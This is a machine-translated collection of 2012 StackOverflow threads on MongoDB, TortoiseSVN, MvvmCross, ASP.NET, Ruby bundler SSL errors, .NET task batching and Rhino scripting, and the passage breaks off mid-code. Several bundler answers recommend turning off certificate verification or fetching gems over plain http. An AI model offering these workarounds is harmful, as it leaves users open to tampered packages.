# StackOverflow 问答 10246000-10246999

# mongodb - Mongoose / mongodb - 删除嵌入文档

> ID：10246004
> 
> 赞同：3
> 
> 时间：2012-04-20T12:11:13.627
> 
> 标签：mongodb, mongoose

我有一个模式（称为事件），其数据如下所示：

```
{ "_id" : ObjectId( "4f8dcb06ee21783d7400003c" ),
  "venue" : ObjectId( "4f8dcb06ee21783d7400003b" ),
  "name" : "Some event",
  "webite: "www.whatever.com",
  "attendees" : [
                    { "_id" : ObjectId( "4f8dfb06ee21783d7134503a" ), "firstName" : "Joe", "lastName" : "Blogs", "emailAddress" : "some@thing1.com" },
                    { "_id" : ObjectId( "4f8dfb06ee21783d7134503b" ), "firstName" : "John", "lastName" : "West", "emailAddress" : "some@thing2.com" }
                    { "_id" : ObjectId( "4f8dfb06ee21783d7134503c" ), "firstName" : "Simon", "lastName" : "Green", "emailAddress" : "some@thing3.com" }
                    { "_id" : ObjectId( "4f8dfb06ee21783d7134503d" ), "firstName" : "Harry", "lastName" : "Smith", "emailAddress" : "some@thing4.com" }
                ],
  "eventType" : "Party"
} 
```

如何“删除” ID 为 4f8dfb06ee21783d7134503c 的参加者对象？

基本上像......

```
Event.findOne('attendees._id' : ObjectId('4f8dfb06ee21783d7134503c'), function(err, eventItem){
    //delete the attendee embedded doc with id 4f8dfb06ee21783d7134503c
}); 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-04-20T13:00:38.150

我认为您正在寻找[$pull](http://www.mongodb.org/display/DOCS/Updating#Updating-%24pull)。

```
db.collection.update({_id: ObjectId( "4f8dcb06ee21783d7400003c" )}, 
                     {$pull: {attendees: {_id: ObjectId( "4f8dfb06ee21783d7134503a" )}}}) 
```

# tortoisesvn - 如何将 Notepad++ 设置为 TortoiseSVN 默认编辑器？

> ID：10246010
> 
> 赞同：14
> 
> 时间：2012-04-20T12:11:26.863
> 
> 标签：tortoisesvn, external, viewer

有时我浏览一个存储库并想查看那里的一些文件，而不是检查它们（假设我正在寻找一个特定的文件）。我有三个选择

*   双击文件打开默认编辑器。对于 .cs 文件，这将是又大又慢的 Visual Studio。而且，自然地，它必须打开一个新副本。
*   右键单击还提供“打开方式...”选项，然后我可以选择我想要的程序
*   右键单击还提供“编辑”选项，然后打开记事本。

我想使用 Notepad++ 作为默认编辑器。或者它可以是打开它的上下文菜单上的“编辑”条目，但不是完整而冗长的“打开方式...”对话框。我可以这样做吗？我还没有找到这样的设置，但也许有一些隐藏的选项或什么的。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-04-20T13:51:20.810

就像 Mand Beckett 所说，这是完整的注册表路径：

```
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\SystemFileAssociations\text\shell\edit\command 
```

更改此键中的（默认）值。请记住将 %1 留在那里。

上述解决方案的问题在于它只会处理被视为文本的文件（在注册表中具有值 PerceivedType=text）。大多数文本文件已经在注册表中被认为是这样的，但是您不能以这种方式打开例如 .lib 文件。为了能够使用以下键中的 Notepad++ 编辑（默认）值从存储库浏览器中打开所有文件（如果不存在则添加键）：

```
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\*\shell\edit\command 
```

注意：在注册表编辑器中，新键将具有 REG_SZ 类型的（默认）值，而不是 REG_EXPAND_SZ。如果您想要 REG_EXPAND_SZ，您必须使用 .reg 文件创建一个密钥。

另一种选择是将所有相关文件类型设置为默认从 Notepad++ 打开，而不是从 Visual Studio 打开。以管理员身份启动 Notepad++，然后在设置 > 首选项 > 文件关联中添加您使用的那些文件关联。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T13:15:52.560

您需要更改 Windows 注册表选项才能执行此操作。您可以在 Tortoise 设置中更改默认`open`程序，但这是`edit` 您想要的功能。寻找

```
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\SystemFileAssociations 
```

在注册表中。

# c# - 如何在 MvvmCross 中将不可见的 ViewModel 添加到导航堆栈

> ID：10246013
> 
> 赞同：2
> 
> 时间：2012-04-20T12:11:39.540
> 
> 标签：c#, xamarin.ios, xamarin.android, mvvmcross

我有以下应用情况。在启动时，我想将“列表”视图模型作为启动视图模型/视图。但我希望用户能够选择返回以转到“菜单”视图模型。这将如何在 MvvmCross 中完成？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-20T12:35:06.017

如果您想支持 WP7，那么导航将难以通过市场提交过程 - 回流在 wp7 上是神圣的。

该流程对于 Android 或 iPhone 用户也没有多大意义...因此您可能会更好地考虑替代 UX 流程 - 您仍然可以拥有流程 ListView->Menu->... 但您可以避免“ BACK”语法，用户理解为 BACK。

* * *

我想我会将这种类型的 UX 实现为：

在启动时通常导航到 ListView/ListViewModel。

呈现某种方式 - 菜单、按钮或超链接 - 让用户导航到 HomeView/HomeViewModel - 但尝试使用“主页”或“菜单”隐喻而不是“返回” - 特别是“返回意味着返回”在 WP7 上。

在导航到主页中，在导航中设置“ClearTop”标志 - 例如：

```
public IMvxCommand GoHomeCommand
{
    get
    {
        return new MvxRelayCommand(RequestNavigate<HomeViewModel>(true));
    }
} 
```

这个“ClearTop”标志将被 iOS 和 WP7 解释为在您到达 Home 后清除导航返回堆栈。然而，遗憾的是它目前在 Android 中不能完美运行 - 所以你需要在你的 Android UI 项目中做一些聪明的事情 - 例如，也许可以找到一种方法来为特殊的启动 ListView/Activity 使用“NoHistory”标志。

* * *

有兴趣了解是否有其他方法可以做到这一点。

# asp.net - aspx 简单的级联下拉菜单

> ID：10246020
> 
> 赞同：0
> 
> 时间：2012-04-20T12:12:41.340
> 
> 标签：asp.net, drop-down-menu, cascadingdropdown

也许之前有人问过这个问题，如果是，那么对不起:)

我在 aspx 中创建一个简单的表单，它有 2 个下拉列表和一个按钮

在第一个 ddl 我有选项可以说：

*   全部
*   诺基亚
*   三星

第二个包含子类别。

*   全部
*   3310
*   N95
*   银河王牌
*   银河SII

如果第一个用户在第二个中选择全部，他将只看到全部。
如果他选择诺基亚，他将看到 All、3310 和 N95；
如果他选择三星，他将看到 All、Galaxy Ace 和 Galaxy SII。

我发现了几篇文章如何使用服务器执行此操作，以从服务器填充第二个下拉列表。

在我的情况下，我不需要服务器，因为我将有大约 10 个项目和 3 个类别。

怎么做？简单的 aspx 或 javascript。

我会很感激。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T12:40:55.277

试试下面的代码。

```
<asp:DropDownList runat="server" AutoPostBack="true" ID="ddlCategories" OnSelectedIndexChanged="ddlCategories_SelectedIndexChanged">
            <asp:ListItem Text="All" Value="All" />
            <asp:ListItem Text="Nokia" Value="Nokia" />
            <asp:ListItem Text="Samsung" Value="Samsung" />
        </asp:DropDownList>
        <asp:DropDownList runat="server" AppendDataBoundItems="true" ID="ddlSubCategories">
            <asp:ListItem Text="All" Value="All" />
        </asp:DropDownList> 
```

因为您没有使用数据库，所以我们必须对值进行硬编码。

```
protected void ddlCategories_SelectedIndexChanged(object sender, EventArgs e)
    {
        ddlSubCategories.Items.Clear();   
        if (string.Compare(ddlCategories.SelectedValue, "Nokia", true) == 0)
        {
            ddlSubCategories.Items.Add(new ListItem("3310", "3310"));
            ddlSubCategories.Items.Add(new ListItem("N95", "N95"));
        }
        else if (string.Compare(ddlCategories.SelectedValue, "Samsung", true) == 0)
        {
            ddlSubCategories.Items.Add(new ListItem("Galaxy Ace", "Galaxy Ace"));
            ddlSubCategories.Items.Add(new ListItem("Galaxy SII", "Galaxy SII"));
        }
        ddlSubCategories.Items.Insert(0, new ListItem("All", "All"));
    } 
```

Hope it helps. If you want to go for javascript route find below link.

[Populate one dropdown based on selection in another](https://stackoverflow.com/questions/5686735/populate-one-dropdown-based-on-selection-in-another)

# ruby-on-rails - 捆绑安装失败并出现 SSL 证书验证错误

> ID：10246023
> 
> 赞同：265
> 
> 时间：2012-04-20T12:13:06.977
> 
> 标签：ruby-on-rails, ruby, ssl, rubygems, bundler

当我`bundle install`在 Centos 5.5 上运行我的 Rails 3 项目时，它失败并出现错误：

```
Gem::RemoteFetcher::FetchError: SSL_connect returned=1 errno=0 state=SSLv3 
read server certificate B: certificate verify failed 
(https://bb-m.rubygems.org/gems/multi_json-1.3.2.gem)
An error occured while installing multi_json (1.3.2), and Bundler cannot continue.
Make sure that `gem install multi_json -v '1.3.2'` succeeds before bundling. 
```

当我尝试手动（通过`gem install multi_json -v '1.3.2'`）安装 gem 时，它可以工作。其他几个宝石也会出现同样的问题。我使用 RVM (1.12.3)、ruby 1.9.2、bundler 1.1.3。

如何解决？

* * *

## 回答 #1

> 赞同：313
> 
> 时间：2012-04-22T01:28:23.727

**更新**

现在我已经从这个答案中挖掘了足够多的业力，每个人都应该知道这应该已经解决了。

回复：再次通过 Ownatik[捆绑安装失败，出现 SSL 证书验证错误](https://stackoverflow.com/questions/10246023/bundle-install-fails-with-ssl-certificate-verification-error/10430331#10430331)

```
gem update --system 
```

我的答案仍然是正确的，如果最终对您不起作用，请在下面留下以供参考。

* * *

老实说，最好的临时解决方案是

> [...] 在您的 gemfile 中使用非 ssl 版本的 ruby​​gems 作为临时解决方法。

通过用户 Ownatik

他们的意思是`Gemfile`在您的rails应用程序目录更改的顶部

`source 'https://rubygems.org'`

到

`source 'http://rubygems.org'`

注意第二个版本是 http 而不是**http**

* * *

## 回答 #2

> 赞同：230
> 
> 时间：2013-08-08T15:28:36.147

将 ssl gem 源替换为非 ssl 作为临时解决方案：

*   宝石来源 -r [https://rubygems.org/](https://rubygems.org/)
*   宝石来源 -a [http://rubygems.org/](http://rubygems.org/)

* * *

## 回答 #3

> 赞同：162
> 
> 时间：2014-12-12T15:42:18.923

原因是旧的红宝石。您需要先使用非 ssl 源更新系统部分：

`gem update --system --source http://rubygems.org/`（使用非 ssl 连接临时更新系统部分）。

现在您可以使用`gem update`.

* * *

## 回答 #4

> 赞同：118
> 
> 时间：2013-10-02T18:03:08.217

如果您在 Mac 上使用最新版本的 RVM（~1.20），以下命令对我有用。

```
rvm osx-ssl-certs update 
```

* * *

## 回答 #5

> 赞同：55
> 
> 时间：2012-05-03T11:22:45.907

这个问题现在应该得到解决。更新 ruby​​gems ( `gem update --system`)，确保 openssl 在您的操作系统上是最新版本，或者尝试以下提示它仍然无法正常工作：[http ://railsapps.github.com/openssl-certificate-verify-failed.html](http://railsapps.github.com/openssl-certificate-verify-failed.html)

* * *

## 回答 #6

> 赞同：52
> 
> 时间：2012-04-20T17:03:09.657

临时解决方案（如 Ownatik 所述）：

在您的主路径中创建或修改名为 .gemrc 的文件，包括该行`:ssl_verify_mode: 0`

这将阻止捆绑程序在尝试安装 gems 时检查它们的 SSL 证书。

对于 *nix 设备，“主路径”表示`~/.gemrc`. `/etc/gemrc`如果您愿意，也可以创建。对于 Windows XP，“主路径”表示`c:\Documents and Settings\All Users\Application Data\gemrc`. 对于 Windows 7，`C:\ProgramData\gemrc`

* * *

## 回答 #7

> 赞同：18
> 
> 时间：2014-03-21T18:17:36.463

在 windows7 上，您可以从[此处](http://curl.haxx.se/ca/cacert.pem)下载 cacert.pem 文件并将环境变量SSL_CERT_FILE 设置为您存储证书的路径，例如

```
SET SSL_CERT_FILE="C:\users\<username>\cacert.pem" 
```

或者您可以像这样在脚本中设置变量`ENV['SSL_CERT_FILE']="C:/users/<username>/cacert.pem"`

将 <username> 替换为您自己的用户名。

* * *

## 回答 #8

> 赞同：15
> 
> 时间：2013-10-22T03:50:02.633

这个问题的真正解决方案，如果您使用的是 RVM：

1.  更新红宝石：`gem update --system`
2.  使用 RVM 刷新 SSL 证书：`rvm osx-ssl-certs update all`

向[RailsApps 项目中的这个提示致敬](http://railsapps.github.io/openssl-certificate-verify-failed.html)！

* * *

## 回答 #9

> 赞同：8
> 
> 时间：2013-10-18T05:36:20.447

[您可以从 curl 的网站http://curl.haxx.se/ca/cacert.pem](http://curl.haxx.se/ca/cacert.pem)下载 CA 证书列表

然后设置 SSL_CERT_FILE 环境变量来告诉 Ruby 使用它。例如，在 Linux 中：

```
$ SSL_CERT_FILE=~/cacert.pem bundle install 
```

（参考：[https](https://gist.github.com/fnichol/867550) ://gist.github.com/fnichol/867550 ）

* * *

## 回答 #10

> 赞同：7
> 
> 时间：2012-04-27T19:35:42.303

对于那些通过 RVM 安装了 ruby​​ 并想要快速修复（不希望按照 Bruno 的要求阅读）的人，试试这个：

```
rvm remove 1.9.x (or whatever version of ruby you are using)
rvm pkg install openssl
rvm install 1.9.2 --with-openssl-dir=$rvm_path/usr 
```

有关更多详细信息，这里是我找到解决方案的链接。

[http://railsapps.github.com/openssl-certificate-verify-failed.html](http://railsapps.github.com/openssl-certificate-verify-failed.html)

顺便说一句，我不必在 Ubuntu 上触摸我的证书。

> 最重要的是，这不是一种解决方法。它将通过 SSL 下载 gem，如果出现中间人攻击等问题，它会失败，这比关闭安全性要好得多。

* * *

## 回答 #11

> 赞同：6
> 
> 时间：2016-10-20T12:25:37.823

这已修复

[http://guides.rubygems.org/ssl-certificate-update/](http://guides.rubygems.org/ssl-certificate-update/)

现在 RubyGems 2.6.x 已经发布，您可以手动更新到这个版本。

下载[https://rubygems.org/downloads/rubygems-update-2.6.7.gem](https://rubygems.org/downloads/rubygems-update-2.6.7.gem)

请将该文件下载到您以后可以指向的目录中（例如，您的硬盘驱动器 C 的根目录：）

现在，使用您的命令提示符：

```
C:\>gem install --local C:\rubygems-update-2.6.7.gem
C:\>update_rubygems --no-ri --no-rdoc 
```

在此之后， gem --version 应该报告新的更新版本。

您现在可以安全地卸载 ruby​​gems-update gem：

```
C:\>gem uninstall rubygems-update -x 
```

* * *

## 回答 #12

> 赞同：5
> 
> 时间：2014-12-27T14:09:24.147

此处给出的关于 .pem 文件的简单复制粘贴说明

[https://gist.github.com/luislavena/f064211759ee0f806c88](https://gist.github.com/luislavena/f064211759ee0f806c88)

对于证书验证失败

> 如果你读过前面的部分，你就会知道这意味着什么（如果你没有读过，你会感到羞耻）。
> 
> 我们需要下载[AddTrustExternalCARoot-2048.pem](https://raw.githubusercontent.com/rubygems/rubygems/master/lib/rubygems/ssl_certs/AddTrustExternalCARoot-2048.pem)。打开命令提示符并输入：
> 
> C:>gem which ruby​​gems C:/Ruby21/lib/ruby/2.1.0/rubygems.rb 现在，让我们找到那个目录。在同一窗口中，输入文件扩展名之前的路径部分，但使用反斜杠：
> 
> C:>start C:\Ruby21\lib\ruby\2.1.0\rubygems 这将在我们指定的目录中打开一个资源管理器窗口。
> 
> 第 3 步：复制新的信任证书
> 
> 现在，找到 ssl_certs 目录并将我们从上一步中获得的 .pem 文件复制到里面。
> 
> 它将与 GeoTrustGlobalCA.pem 等其他文件一起列出。

* * *

## 回答 #13

> 赞同：4
> 
> 时间：2012-04-20T12:36:51.540

同样的问题，但这里有不同的宝石：

```
Gem::RemoteFetcher::FetchError: SSL_connect returned=1 errno=0 state=SSLv3 
read server certificate B: certificate verify failed 
(https://bb-m.rubygems.org/gems/builder-3.0.0.gem)
An error occured while installing builder (3.0.0), and Bundler cannot continue.
Make sure that `gem install builder -v '3.0.0'` succeeds before bundling. 
```

临时解决方案：`gem install builder -v '3.0.0'`可以继续`bundle install`

* * *

## 回答 #14

> 赞同：4
> 
> 时间：2013-10-16T14:20:31.487

最简单的解决方案：

```
rvm pkg install openssl
rvm reinstall all --force 
```

瞧！

* * *

## 回答 #15

> 赞同：4
> 
> 时间：2014-07-29T20:23:45.817

这是在 Windows 上解决此问题的方法：

下载 .perm 文件，然后在命令提示符中设置 SSL_CERT_FILE

[https://gist.github.com/fnichol/867550](https://gist.github.com/fnichol/867550)

* * *

## 回答 #16

> 赞同：4
> 
> 时间：2016-10-19T18:47:23.967

我对 Windows 的永久修复：

1.  下载[CACert](https://raw.githubusercontent.com/rubygems/rubygems/master/lib/rubygems/ssl_certs/index.rubygems.org/GlobalSignRootCA.pem)，另存`C:\ruby\ssl_certs\GlobalSignRootCA.pem`为[http://guides.rubygems.org/ssl-certificate-update/](http://guides.rubygems.org/ssl-certificate-update/)

2.  创建名为“ **SSL_CERT_FILE** ”的系统变量，设置为`C:\ruby\ssl_certs\GlobalSignRootCA.pem`.

3.  再试一次`gem install bundler`：：

> ```
> C:\gem sources
> *** CURRENT SOURCES ***
> https://rubygems.org/
> 
> C:\gem install bundler
> Fetching: bundler-1.13.5.gem (100%)
> Successfully installed bundler-1.13.5
> 1 gem installed 
> ```

* * *

## 回答 #17

> 赞同：3
> 
> 时间：2012-04-28T14:40:25.763

在 Ubuntu 12.04 上，我得到了一个稍微不同的错误，尽管可能相关：

```
Gem::RemoteFetcher::FetchError: SSL_connect returned=1 errno=0 state=unknown state: sslv3 alert handshake failure (https://d2chzxaqi4y7f8.cloudfront.net/gems/activesupport-3.2.3.gem)
An error occured while installing activesupport (3.2.3), and Bundler cannot continue.
Make sure that `gem install activesupport -v '3.2.3'` succeeds before bundling. 
```

当我在 Gemfile 中运行`bundle install`时会发生这种情况。`source 'https://rubygems.org'`

这是 Ubuntu 12.04 上的 OpenSSL 的问题。请参阅[Rubygems 问题 #319](https://github.com/rubygems/rubygems/issues/319#issuecomment-5403091)。

要解决此问题，`apt-get update && apt-get upgrade`请在 Ubuntu 12.04 上运行以升级您的 OpenSSL。

* * *

## 回答 #18

> 赞同：3
> 
> 时间：2016-10-18T19:20:12.780

我能够追查到这样一个事实，即`rvm`下载的二进制文件与 OS X 的 OpenSSL 不兼容，该 OpenSSL 已经过时且操作系统不再使用。

我的解决方案是在通过以下方式安装 Ruby 时强制编译`rvm`：

```
rvm reinstall --disable-binary 2.2 
```

* * *

## 回答 #19

> 赞同：3
> 
> 时间：2016-12-18T19:48:18.683

感谢@Alexander.Iljushkin：

`gem update --system --source http://rubygems.org/`

之后捆绑器仍然失败，解决方案是：

`gem install bundler`

* * *

## 回答 #20

> 赞同：2
> 
> 时间：2014-03-24T17:53:49.103

我遇到了类似的错误。以下是我解决此问题的方法：在您的路径目录中，检查 Gemfile。将 gemfile 中的源代码编辑为 http 而不是 https 并保存。这可能会在没有 SSL 证书 issue.l 的情况下安装捆绑程序

* * *

## 回答 #21

> 赞同：2
> 
> 时间：2016-06-17T00:11:43.713

对于 Windows 机器，检查您的 gem 版本

```
gem --version 
```

然后按如下方式更新您的 gem：

*   运行 1.8.x：[下载 1.8.30](https://github.com/rubygems/rubygems/releases/tag/v1.8.30)
*   运行 2.0.x：[下载 2.0.15](https://github.com/rubygems/rubygems/releases/tag/v2.0.15)
*   运行 2.2.x：[下载 2.2.3](https://github.com/rubygems/rubygems/releases/tag/v2.2.3)

请将该文件下载到您以后可以指向的目录中（例如，您的硬盘驱动器 C 的根目录：）

现在，使用您的命令提示符：

```
C:\>gem install --local C:\rubygems-update-1.8.30.gem
C:\>update_rubygems --no-ri --no-rdoc 
```

现在，捆绑安装将成功，没有 SSL 证书验证错误。

更详细的说明在[这里](https://gist.github.com/luislavena/f064211759ee0f806c88)

* * *

## 回答 #22

> 赞同：1
> 
> 时间：2016-10-12T20:08:13.887

这对我有用：

*   [在https://rubygems.org/pages/download](https://rubygems.org/pages/download)下载最新的 gem
*   安装gem`gem install --local [path to downloaded gem file]`
*   更新宝石`update_rubygems`
*   检查您是否使用最新的 gem 版本`gem --version`

* * *

## 回答 #23

> 赞同：1
> 
> 时间：2016-11-04T19:37:49.673

我不得不重新安装openssl：

```
brew uninstall --force openssl
brew install openssl 
```

* * *

## 回答 #24

> 赞同：1
> 
> 时间：2017-01-05T07:30:02.630

我最近才遇到这个问题，并按照[此处](https://gemfury.com/help/could-not-verify-ssl-certificate)概述的步骤进行操作。您可能没有指向正确的 OpenSSL 证书。运行后：

```
rvm osx-ssl-certs status all
rvm osx-ssl-certs update all 
```

和

```
export SSL_CERT_FILE=/etc/ssl/certs/ca-certificates.crt 
```

捆绑完成运行！

* * *

## 回答 #25

> 赞同：1
> 
> 时间：2017-01-11T07:24:20.687

下载 [ruby​​gems-update-2.6.7.gem](https://rubygems.org/downloads/rubygems-update-2.6.7.gem)。

现在，使用您的命令提示符：

```
C:\>gem install --local C:\rubygems-update-2.6.7.gem
C:\>update_rubygems --no-ri --no-rdoc 
```

在此之后，`gem --version`应该报告新的更新版本。

您现在可以安全地卸载 ruby​​gems-update gem：

```
C:\>gem uninstall rubygems-update -x
Removing update_rubygems
Successfully uninstalled rubygems-update-2.6.7 
```

* * *

## 回答 #26

> 赞同：1
> 
> 时间：2017-03-07T13:40:40.937

请注意，如果您从 SSL 证书受内部证书颁发机构信任的来源获取 gem（或者您通过具有 SSL 检查的公司 Web 代理连接到外部来源），请将 SSL_CERT_FILE env 变量指向您的证书链. 这很可能只需要将您的根证书从您的证书存储（macOS 上的系统钥匙串）导出到您的 shell 的可访问位置，即：

```
export SSL_CERT_FILE=~/RootCert.pem 
```

* * *

## 回答 #27

> 赞同：1
> 
> 时间：2017-04-30T10:52:22.760

## 如果你正在使用`rails-assets`

如果您`https://rails-assets.org/`用来管理您的资产，那么没有任何答案会对您有所帮助。即使转换为`http`也无济于事。

最简单的解决方法是改用此源， `http://insecure.rails-assets.org`. [这在他们的主页](https://rails-assets.org/#/)上已经提到过。

* * *

## 回答 #28

> 赞同：0
> 
> 时间：2017-08-18T07:39:47.217

在旧版 Windows 系统和 ruby​​ 1.9 版本上唯一对我有用的是从 [http://guides.rubygems.org/ssl-certificate-update/下载 cacert 文件](http://guides.rubygems.org/ssl-certificate-update/)

然后在运行 bundle install 之前运行以下命令

```
bundle config --global ssl_ca_cert /path/to/file.pem 
```

# .net - 创建一个将多个 I/O 任务分组的任务

> ID：10246028
> 
> 赞同：1
> 
> 时间：2012-04-20T12:13:19.587
> 
> 标签：.net, multithreading, asynchronous, task-parallel-library, sqlcommand

首先，我不确定我是否在问一些愚蠢的问题，所以在开始之前道歉。

我有一个方法使用 SqlCommand 异步保存数据库中的实体集合，它返回一个表示异步操作的任务，到目前为止它运行良好。基本上它会为每个实体生成一个 SQL 命令和一堆参数，并将它们全部添加到 SqlCommand 实例中（参数已编号）

但是，如果我尝试插入很多实体，当参数计数达到 2100 时，SQL 操作就会失败，因为那是限制。然后我想分批拆分实体集合，并按顺序执行它们，然后返回一个直到所有子任务都完成后才会完成的任务。（应该是最后一个）

每个子任务都会得到一个 Int32，说明有多少行发生了变化，最终任务必须返回所有行的总和。所以所有的任务都是Task。如果其中一个失败，它们都必须“回滚”，因此它们必须共享连接和事务对象。

另外，我想确保我在 Task 和 SqlCommand 中正确使用了 I/O 完成端口，并且在 SQL Server 上的操作完成时没有线程等待/旋转，因为这个“保存”操作是从 ASP.NET MVC 中的异步控制器调用。

这里的正确方法是什么？

问候。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T14:20:56.493

如果您要拆分插入，但按顺序运行它们，则不需要为每个调用使用任务。你只需要正常的顺序代码。

创建一个启动 Task 并返回它的方法。在任务主体中，只需执行您想要的任何正常顺序代码。完成后，退出任务主体，单个任务将完成。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T16:55:43.220

使用 C# 5（并假设基于任务的异步），这将非常简单：

```
async Task<IReadOnlyList<SomeType>> PerformUpdatesAsync(
    IEnumerable<AnotherType> data)
{
    var result = new List<SomeType>();

    foreach (var batch in data.SplitIntoBatches(BatchSize))
        result.Add(await PerformUpdateAsync(batch));

    return result;
} 
```

在 C# 5 之前的版本中模拟异步`foreach`比较困难，但是您可以使用批处理队列和“递归”lambda 来实现它：

```
Task<SomeType[]> PerformUpdatesAsync(IEnumerable<AnotherType> data)
{
    var batches = new Queue<IEnumerable<AnotherType>>(
        data.SplitIntoBatches(BatchSize));

    var result = new List<SomeType>();

    var tcs = new TaskCompletionSource<SomeType[]>();

    AsyncCallback onEndUpdate = null;
    onEndUpdate =
        ar =>
        {
            result.Add(EndUpdate(ar));

            if (batches.Count == 0)
                tcs.SetResult(result.ToArray());
            else
                BeginUpdate(batches.Dequeue(), onEndUpdate, null);
        };

    BeginUpdate(batches.Dequeue(), onEndUpdate, null);

    return tcs.Task;
} 
```

如果您不喜欢以这种方式使用闭包，您可以通过创建一个单独的类来做同样的事情，该类将在其字段中保存所有局部变量。

框架中没有`SplitIntoBatches()`，因此您必须自己编写（除非您已经这样做了）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T12:30:45.297

这是一个很好的问题。这是一些代码：

```
Task<int>[] batchTasks = ...;//start the batches here. each task should return the count of changed rows
Task<int> sumTask = Task.Factory.ContinueWhenAll(batchTasks, _ => {
 return batchTasks.Sum(x => x.Result);
}); 
```

这将为您提供各个批次的无阻塞总和。

启动批处理时，请务必使用 BeginExecuteReader 等异步 SQL API。然后，您将完全无阻塞。

# c++ - 如何在 C++ 中运行 .sql 脚本文件？

> ID：10246029
> 
> 赞同：4
> 
> 时间：2012-04-20T12:13:20.200
> 
> 标签：c++, mysql, database

我想在我的代码中执行一个 mysql 的脚本文件，用 C++ 编写。我该怎么做？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-20T12:18:27.857

您始终可以使用该`system`函数调用`mysql`程序为您执行此操作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T12:38:55.990

好吧，如果您想要最佳解决方案，只需使用标准 C++ 文件处理方法遍历每一行（您的 SQL 文件每行只有一个命令）。

您只需将每一行传递给 MySQL 库调用。这就是我为我的 SQLite 初始化脚本所做的。

您甚至可以添加非常少的注释支持（如`--`）并跳过以这些字符开头的任何行。

# java - 在执行过程中停止 Rhino 引擎

> ID：10246030
> 
> 赞同：7
> 
> 时间：2012-04-20T12:13:20.690
> 
> 标签：java, rhino

Rhino 引擎是否有 api 可以在中间停止执行脚本文件。例如，我有一个脚本文件，其中有一个无限循环。我怎样才能在中间停止执行？

当然，我可以停止启动Rhino引擎的jvm来执行脚本。但是我不想因为这个原因而终止整个 jvm 会话，因为我已经以编程方式启动了脚本，并且 Rhino 引擎也在与我的应用程序相同的 JVM 中运行。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-26T10:48:33.643

可以使用以下方式停止正在运行的 JavaScript 的执行。

1）创建一个虚拟调试器并将其附加到最初创建的上下文中。

mContext = Context.enter();
ObservingDebugger observingDebugger = new ObservingDebugger();
mContext.setDebugger(observingDebugger, new Integer(0));
mContext.setGeneratingDebug(true);
mContext.setOptimizationLevel(-1);

ObservingDebugger 代码如下所示。

```
import org.mozilla.javascript.Context;
import org.mozilla.javascript.Scriptable;
import org.mozilla.javascript.debug.DebugFrame;
import org.mozilla.javascript.debug.DebuggableScript;
import org.mozilla.javascript.debug.Debugger;

public class ObservingDebugger implements Debugger 
{
boolean isDisconnected = false;

private DebugFrame debugFrame = null;

public boolean isDisconnected() {
    return isDisconnected;
}

public void setDisconnected(boolean isDisconnected) {
    this.isDisconnected = isDisconnected;
    if(debugFrame != null){
       ((ObservingDebugFrame)debugFrame).setDisconnected(isDisconnected);
    }
}

public ObservingDebugger() {

}

public DebugFrame getFrame(Context cx, DebuggableScript fnOrScript)
{
    if(debugFrame == null){
        debugFrame = new ObservingDebugFrame(isDisconnected);
    }
    return debugFrame;      
}

@Override
public void handleCompilationDone(Context arg0, DebuggableScript arg1, String arg2) {   } }
// internal ObservingDebugFrame class
class ObservingDebugFrame implements DebugFrame
   {
boolean isDisconnected = false;

public boolean isDisconnected() {
    return isDisconnected;
}

public void setDisconnected(boolean isDisconnected) {
    this.isDisconnected = isDisconnected;
}

ObservingDebugFrame(boolean isDisconnected)
{
    this.isDisconnected = isDisconnected;
}

public void onEnter(Context cx, Scriptable activation,
        Scriptable thisObj, Object[] args)
{ }

public void onLineChange(Context cx, int lineNumber) 
{
    if(isDisconnected){
        throw new RuntimeException("Script Execution terminaed");
    }
}

public void onExceptionThrown(Context cx, Throwable ex)
{ }

public void onExit(Context cx, boolean byThrow,
        Object resultOrException)
{ }

@Override
public void onDebuggerStatement(Context arg0) { } } 
```

ObservingDebugger 类将管理布尔变量“isDisconnected”，当用户单击停止按钮（想要停止执行）时，此变量设置为 true。一旦变量如下设置为 true，Rhino Execution 将立即终止。

```
observingDebugger.setDisconnected(true); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-23T21:22:52.277

对于寻找解决方案的其他人，ContextFactory 的 javadoc 详细说明了如何停止运行超过 10 秒的脚本：

[https://github.com/mozilla/rhino/blob/master/src/org/mozilla/javascript/ContextFactory.java](https://github.com/mozilla/rhino/blob/master/src/org/mozilla/javascript/ContextFactory.java)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-11-13T17:24:20.723

我使用 ExecutorService 和超时的 future.get 在新线程中执行脚本

```
 ExecutorService executor = Executors.newSingleThreadExecutor();

    Future<?> future = executor.submit(threadEvaluation);

    try {
        System.out.println("Started..");
        future.get(100, TimeUnit.MILLISECONDS);
        System.out.println("Finished!");
    } catch (TimeoutException e) {
        future.cancel(true);
        System.out.println("Terminated!");
    } 
```

请注意，这种方法不会停止执行脚本的线程！为了做到这一点，由于执行脚本的线程将被通知被中断，您可以创建一个自定义的 ContextFactory 来定期监控这种情况：

```
public class InterruptableContextFactory extends ContextFactory {

    public static boolean initialized = false;

    public static void init() {
        if (!initialized) {
            ContextFactory.initGlobal(new InterruptableContextFactory());
            initialized = true;
        }
    }

    @Override
    protected void observeInstructionCount(Context cx, int instructionCount) {
        System.out.println(instructionCount + " javascript instructions!");
        if (Thread.currentThread().isInterrupted()) {
            throw new Error("script execution aborted");
        }
    }

    @Override
    protected Context makeContext() {
        Context cx = super.makeContext();
        //set a number of instructions here
        cx.setInstructionObserverThreshold(10000);
        return cx;
    }
} 
```

在创建任何 Context 对象之前，您需要将应用程序配置为默认使用此 ContextFactory，只需调用

```
InterruptableContextFactory.init() 
```

在 Callable 的调用方法中，您可以捕获错误：

```
 try {
        cx.setOptimizationLevel(9);
        cx.setInstructionObserverThreshold(10000);
